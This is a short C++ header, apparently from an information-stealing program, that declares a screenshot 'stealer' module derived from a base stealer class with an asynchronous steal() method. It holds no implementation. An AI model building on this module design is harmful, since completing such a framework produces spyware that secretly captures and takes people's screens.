#ifndef SRCEENSHOT_STEALER_H
#define SRCEENSHOT_STEALER_H
#include "base_stealer.h"

class srceenshot_stealer_t : public base_stealer_t
{
public:
    asio::awaitable<std::unique_ptr<message_t>> steal() override;
};

#endif //SRCEENSHOT_STEALER_H
